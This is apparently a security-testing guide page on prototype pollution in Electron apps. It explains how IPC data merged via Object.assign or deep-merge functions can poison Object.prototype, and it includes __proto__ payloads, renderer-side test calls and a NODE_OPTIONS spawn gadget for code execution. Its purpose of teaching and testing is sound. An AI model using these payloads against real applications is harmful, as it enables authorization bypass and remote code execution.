---
title: Prototype Pollution
description: Prototype pollution in Electron apps — poisoning Object.prototype to bypass security checks and enable code execution
---

# Prototype Pollution

Prototype pollution is one of those vulnerability classes that looks theoretical until you actually find the gadget chain that turns property injection into a security check bypass. In Electron apps it's genuinely useful, particularly in the main process, where `Object.assign` calls with IPC-supplied data can silently modify `Object.prototype` and affect every subsequent object created anywhere in the process.

The vulnerability is: attacker controls data that gets merged into an object without filtering `__proto__` or `constructor` keys. The impact is: every empty object in the main process now has the attacker-supplied properties.

---

## How It Works

JavaScript's prototype chain means that when you look up a property on an object, if it's not found on the object itself, JavaScript checks the object's prototype, then the prototype's prototype, up to `Object.prototype`. Pollute `Object.prototype` and every object inherits those properties:

```javascript
// Normal behavior:
const obj = {};
console.log(obj.isAdmin);  // undefined

// After prototype pollution:
Object.prototype.isAdmin = true;

const obj2 = {};
console.log(obj2.isAdmin);  // true — not the object's own property
console.log(obj2.hasOwnProperty('isAdmin'));  // false — still not own property

// Security check that fails:
if (user.isAdmin) {
  grantAccess();  // user = {} → user.isAdmin = true from prototype → access granted
}
```

---

## In Electron: Getting Into the Main Process

With `contextIsolation: true`, prototype pollution in the renderer's JavaScript context doesn't spread to the preload or main process — they run in separate V8 worlds with separate prototype chains.

But the main process handles IPC. And IPC data can trigger prototype pollution in the main process itself.

### Path 1: Object.assign with IPC Data

The most common vector — a handler merges renderer-supplied settings into an app config object:

```javascript
// main.js — VULNERABLE:
ipcMain.on('update-settings', (event, settings) => {
  // settings from renderer is an arbitrary object
  // Object.assign propagates __proto__:
  Object.assign(appConfig, settings);
  // Payload: settings = { "__proto__": { "isAdmin": true } }
  // Result: Object.prototype.isAdmin = true — affects the entire main process
});

// Later in main.js, completely unrelated code:
function checkPermission(request) {
  if (request.isAdmin) {  // request = {} → true from prototype
    return grantElevatedAccess();
  }
}
```

### Path 2: Deep Merge with User Data

Custom deep merge implementations frequently don't filter `__proto__`:

```javascript
// Common vulnerable pattern:
function deepMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = target[key] || {};
      deepMerge(target[key], source[key]);  // recurses into __proto__
    } else {
      target[key] = source[key];
    }
  }
}

// Payload: { "__proto__": { "isAdmin": true } }
// deepMerge({}, payload) → Object.prototype.isAdmin = true
```

### Path 3: Third-Party JSON Parsers

Standard `JSON.parse` in Node.js does NOT propagate `__proto__` — it treats it as a regular key. But some alternative parsers (json5, hjson, yaml, certain config parsers) do:

```javascript
const yaml = require('js-yaml');
// Some YAML parsers allow arbitrary object instantiation:
yaml.load('{ __proto__: { isAdmin: true } }');
// May pollute Object.prototype depending on YAML parser version
```

---

## When contextIsolation Matters

- `contextIsolation: true` (default since Electron 12):
  - Pollution in renderer page → affects renderer only, not preload
  - But IPC-delivered pollution to main process still works
  - contextBridge clones data — polluted objects lose their prototype chain crossing the bridge

- `contextIsolation: false` (legacy):
  - Pollution in renderer XSS → affects preload code too
  - Same `Object.prototype` shared between page and preload

The IPC vector works regardless of contextIsolation state, because the main process handles IPC arguments directly.

---

## Code Execution via Gadget Chains

Prototype pollution alone doesn't give you code execution. You need a gadget — code that uses a prototype property in a dangerous way. In Node.js, these exist:

```javascript
// child_process spawn gadget (exists in some module versions):
const options = { ...userOptions };  // spread copies prototype properties too
if (options.env) {
  // options.env exists because Object.prototype.env was polluted
  spawn(command, options);
  // Now spawn has attacker-controlled environment:
  // NODE_OPTIONS: '--require /tmp/evil.js' → loads attacker script
}

// Object.prototype.env = { NODE_OPTIONS: '--require /tmp/evil.js' };
```

Finding gadgets requires reading all `spawn`/`exec`/`fork` call sites in the main process and checking if any of their options objects could have prototype-inherited properties affect the execution.

---

## Testing for Prototype Pollution

From DevTools or an XSS payload in the renderer:

```javascript
// Test if Object.assign propagates __proto__ to main process:
ipcRenderer.invoke('update-settings', { "__proto__": { "polluted": "yes" } });

// Then check if pollution reached main process (may need another IPC call
// that returns a value affected by prototype):
ipcRenderer.invoke('check-debug').then(console.log);

// Test via constructor:
ipcRenderer.invoke('update-settings', { "constructor": { "prototype": { "polluted": "yes" } } });
```

---

## Finding Vulnerable Patterns

```bash
# Object.assign with IPC event data:
grep -r "Object\.assign" --include="*.js" . -A 3 | \
  grep -E "event\.|ipc|data|settings|config|request" | grep -v node_modules

# Custom merge functions:
grep -r "deepMerge\|deepAssign\|deepExtend\|mergeDeep\|_.merge\b" \
  --include="*.js" . | grep -v node_modules

# Direct key iteration without filtering:
grep -r "Object\.keys\s*(" --include="*.js" . -B 2 -A 10 | \
  grep -B 5 "target\[key\]\s*=" | grep -v node_modules

# JSON.parse of renderer-supplied data (check the parser):
grep -r "JSON\.parse\|yaml\.load\|json5\.parse" --include="*.js" . -B 3 | \
  grep -E "event\.|ipc\|user\|request\|socket" | grep -v node_modules
```

---

## Severity

Prototype pollution in Electron apps typically falls into three categories:

- **Prototype pollution → auth bypass in main process**: High (P2). Direct security impact.
- **Prototype pollution → spawn gadget with NODE_OPTIONS**: High to Critical. Depends on the gadget.
- **Prototype pollution in renderer only (contextIsolation:true, no gadget)**: Low to Medium. Limited blast radius.

The hardest part is finding the gadget. Most prototype pollution findings are reported as "security check bypass" rather than "code execution" because demonstrating the auth bypass requires less work than constructing a reliable RCE gadget.
